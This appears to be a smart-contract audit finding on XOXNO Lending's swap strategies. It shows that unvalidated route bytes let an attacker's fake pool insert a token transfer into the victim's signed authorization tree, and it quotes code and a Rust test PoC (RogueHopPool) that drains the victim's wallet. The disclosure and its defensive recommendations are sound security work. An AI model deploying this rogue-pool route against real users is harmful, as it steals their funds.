### Title
Attacker-controlled route injects arbitrary contract code under the caller's authorization tree, draining the caller's entire wallet — (`contracts/controller/src/strategies/swap.rs`)

### Summary
The CVE class is *unsanitized client-controlled input executed in a privileged context*: Samba's `%u` substitutes the attacker-supplied username verbatim into a shell command. The analog in XOXNO Lending is the user-supplied `swap`/`swap_xdr` route bytes accepted by the controller's strategy entrypoints (`swap_collateral`, `swap_debt`, `multiply`, `repay_debt_with_collateral`). The controller passes these bytes to the router without any allowlist of the pools/tokens the route names, and the router invokes whatever contract addresses the payload contains — with the caller's `require_auth` still on the stack. A malicious "pool" in the route can call `token.transfer(victim, attacker, amount)` on *any* token the victim holds; the host records that call as a child of the victim's signed authorization entry, and it executes the moment the victim signs the simulated auth tree — which is exactly what a standard wallet does. The theft is not bounded by the routed amount, the payload minimum, or the final health-factor check.

### Finding Description
`swap_tokens` in `contracts/controller/src/strategies/swap.rs` authorizes one exact input transfer to the router and then calls `router.execute_strategy(&controller, &amount_in, swap)` inside `with_flash_guard` [1](#0-0) . The route (`swap: &StrategySwap`) is raw XDR supplied by the caller; neither the controller nor the router validates which contract addresses it names. The threat model states this explicitly: "The router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization" [2](#0-1) .

The harness test `rogue_hop_pool_transfer_joins_caller_auth_tree.rs` proves the mechanism end-to-end: an attacker-deployed `RogueHopPool` whose `swap` simply calls `wallet_token.transfer(victim, attacker, WALLET_BALANCE)` is invoked mid-route, the transfer is recorded by simulation as a child of the victim's `swap_collateral` auth entry, and in enforcing mode it executes if the signed tree includes it — leaving the victim's wallet at zero while the protocol-level swap still settles "fairly" [3](#0-2) [4](#0-3) . The controller's post-checks only bound the router's spend of the granted input (`RouterOverspend`) and require positive measured output (`NoSwapOutput`) — they do not and cannot observe a transfer of an unrelated wallet token [5](#0-4) .

### Impact Explanation
Theft of user funds, up to the victim's entire balance of *any* token — including tokens the protocol never listed — not merely the routed `amount_in`. As the threat model notes, "the loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it" [6](#0-5) . The same exposure applies to every caller of the router, including direct `execute_strategy` users and every controller strategy that forwards route bytes.

### Likelihood Explanation
The attack requires the victim to submit a poisoned route, i.e. to obtain `swap_xdr` from an attacker-controlled source (malicious quote server, compromised/malicious frontend, phishing route) and then sign the auth tree that `simulateTransaction` returns. Signing the simulated tree is the standard wallet flow; nothing in the transaction visually distinguishes a route whose tree contains an extra `token.transfer(victim → attacker)` child. The test demonstrates that simulation in recording mode silently attaches the theft call under the caller's entry, so the poisoned tree is what the wallet presents for signature [7](#0-6) . This is a genuine conditioning requirement (user interaction + malicious route source), so likelihood is moderate rather than high — appropriate for a High-severity rather than Critical rating.

### Recommendation
The defense must mirror the Samba fix — never let untrusted input reach the privileged context unfiltered:

1. **Allowlist venues in the controller or router.** The controller already knows the legitimate router address (`storage::get_swap_aggregator`); the router should maintain an owner- or governance-managed allowlist of permitted pool contracts per venue opcode, so a route cannot substitute arbitrary attacker code for a pool.
2. **Constrain the auth surface.** Where possible, have the router (not the caller) custody intermediate steps so third-party code never runs below the caller's `require_auth` frame; the controller already does this correctly for its *own* funds via invoker auth, but end users calling the router directly remain exposed.
3. **Client-side mitigation (already partially documented):** clients must decode `routeXdr`, verify every pool/token address against a known registry, and reject any simulated authorization tree that contains children other than the single expected input `transfer` [8](#0-7) . This should be enforced in the official SDK rather than left as guidance.

### Proof of Concept
See `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`, which is a working PoC:

- `RogueHopPool::swap` executes `token.transfer(victim, attacker, WALLET_BALANCE)` on an unlisted token [3](#0-2) .
- `route_through_pool_stealing` embeds the rogue pool address as the route's `hop_pool` and passes it to `ctrl.try_swap_collateral(alice, account_id, usdc, SWAP_IN_USDC, eth, route)` — an unprivileged entrypoint [9](#0-8) .
- In recording mode the theft transfer is attached under Alice's `swap_collateral` auth entry; signing that tree executes the theft (`wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`), while the protocol-level swap still succeeds [10](#0-9) .
- The honest signed tree correctly refuses the call, confirming the vulnerability is the absence of venue/path validation, not a host auth failure [11](#0-10) .

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L34-38)
```rust
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L41-54)
```rust
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-72)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-256)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
